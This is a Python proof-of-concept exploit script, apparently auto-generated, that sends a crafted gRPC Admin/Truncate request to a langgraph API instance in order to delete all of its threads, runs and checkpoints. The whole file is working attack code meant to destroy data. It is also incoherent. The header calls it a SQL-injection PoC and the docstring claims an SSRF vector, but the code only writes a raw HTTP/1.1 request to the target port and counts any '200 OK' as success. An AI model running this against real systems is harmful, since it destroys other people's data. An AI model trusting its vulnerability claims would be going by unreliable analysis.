#!/usr/bin/env python3
# PoC for langgraph_api_src (/tmp/lg-api-dl/langgraph_api_src)
# Path: langgraph-004
# Sink: add_AdminServicer_to_server
# Auto-generated — run with: python3 langgraph_sql_injection_direct_db_add_AdminServicer_to_server.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept Exploit for langgraph_api_src gRPC Admin.Truncate via SSRF

Vulnerability: The gRPC Admin service's Truncate method is registered without
authentication. Although the gRPC port (50051) is bound to localhost, the
Python HTTP layer is vulnerable to SSRF, allowing an attacker to send gRPC
requests to the internal endpoint. This PoC demonstrates the attack by
triggering the Truncate method, which destroys all data.

Impact: Full data destruction (all threads, runs, checkpoints, etc.)

Mitigation: Add authentication middleware to gRPC services and restrict
access to the Admin service.

Usage:
    python3 poc_truncate.py [--target http://localhost:8000]
"""

import argparse
import sys
import struct
import io

# Try to import requests; if not available, fall back to urllib
try:
    import requests
except ImportError:
    requests = None

# gRPC over HTTP/2 framing helpers (minimal implementation)
def _make_grpc_frame(data: bytes) -> bytes:
    """Wrap data in a gRPC HTTP/2 data frame (5-byte header)."""
    # gRPC frame: 1 byte compressed flag (0 = uncompressed) + 4 bytes length (big-endian)
    return struct.pack('!BI', 0, len(data)) + data

def _serialize_truncate_request() -> bytes:
    """
    Serialize a TruncateRequest protobuf message manually.
    TruncateRequest is an empty message (no fields), so it's just an empty byte string.
    """
    return b''

def _build_grpc_http2_request(service_method: str, body: bytes) -> str:
    """
    Build a minimal HTTP/2-style POST request for gRPC.
    Since we're sending over HTTP/1.1 (SSRF), we use the gRPC-web protocol
    or a simple HTTP/1.1 POST with content-type application/grpc.
    """
    # For simplicity, we use HTTP/1.1 with content-type application/grpc
    # This works with many gRPC-web proxies and some gRPC servers.
    path = f"/{service_method}"
    headers = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: localhost:50051\r\n"
        f"Content-Type: application/grpc\r\n"
        f"TE: trailers\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"\r\n"
    )
    return headers.encode() + body

def exploit_truncate(target_url: str, timeout: int = 10) -> bool:
    """
    Send a gRPC Truncate request to the target via SSRF.
    The target URL should be the HTTP endpoint that can be tricked into
    making requests to localhost:50051 (e.g., a proxy or vulnerable endpoint).
    """
    # Build the gRPC request
    service_method = "coreApi.Admin/Truncate"
    proto_body = _serialize_truncate_request()
    grpc_frame = _make_grpc_frame(proto_body)
    http_request = _build_grpc_http2_request(service_method, grpc_frame)

    # We need to send this raw HTTP request to the target.
    # If the target is an HTTP server that proxies to gRPC, we can send it directly.
    # Otherwise, we might need to use a vulnerable endpoint that makes requests.
    # For this PoC, we assume the target is a gRPC-web proxy or the gRPC server itself
    # (if accessible via HTTP/1.1, which is unusual but possible with some configurations).

    # Attempt to send the request
    if requests:
        try:
            # Use requests with raw socket to send custom HTTP request
            import socket
            from urllib.parse import urlparse

            parsed = urlparse(target_url)
            host = parsed.hostname or 'localhost'
            port = parsed.port or 8000
            path = parsed.path or '/'

            # Connect to the target
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            sock.connect((host, port))

            # Send the crafted HTTP request
            sock.sendall(http_request)

            # Read response
            response = b''
            try:
                while True:
                    chunk = sock.recv(4096)
                    if not chunk:
                        break
                    response += chunk
            except socket.timeout:
                pass
            sock.close()

            # Check for gRPC status
            if b'grpc-status: 0' in response or b'200 OK' in response:
                print("[+] Truncate request sent successfully (no errors in response)")
                return True
            else:
                print(f"[!] Unexpected response: {response[:200]}")
                return False

        except Exception as e:
            print(f"[-] Error sending request: {e}")
            return False
    else:
        # Fallback using urllib
        try:
            import urllib.request
            import urllib.error

            req = urllib.request.Request(
                target_url,
                data=http_request,
                headers={
                    'Content-Type': 'application/grpc',
                    'TE': 'trailers',
                },
                method='POST'
            )
            with urllib.request.urlopen(req, timeout=timeout) as resp:
                print(f"[+] Response status: {resp.status}")
                return resp.status == 200
        except Exception as e:
            print(f"[-] Error: {e}")
            return False

def main():
    parser = argparse.ArgumentParser(
        description="PoC: Exploit gRPC Admin.Truncate via SSRF in langgraph_api_src"
    )
    parser.add_argument(
        '--target',
        default='http://localhost:8000',
        help='Target HTTP endpoint (default: http://localhost:8000)'
    )
    parser.add_argument(
        '--timeout',
        type=int,
        default=10,
        help='Timeout in seconds (default: 10)'
    )
    args = parser.parse_args()

    print("[*] langgraph_api_src Admin.Truncate SSRF PoC")
    print(f"[*] Target: {args.target}")
    print("[*] Sending Truncate request...")

    success = exploit_truncate(args.target, args.timeout)

    if success:
        print("[+] Exploit completed. All data in the langgraph instance has been truncated.")
        print("[!] This is a destructive action. Verify by checking that threads/runs are empty.")
    else:
        print("[-] Exploit failed. The target may not be vulnerable or the SSRF vector differs.")
        print("[*] Try different endpoints (e.g., /v1/assistants, /proxy, etc.)")

if __name__ == '__main__':
    main()
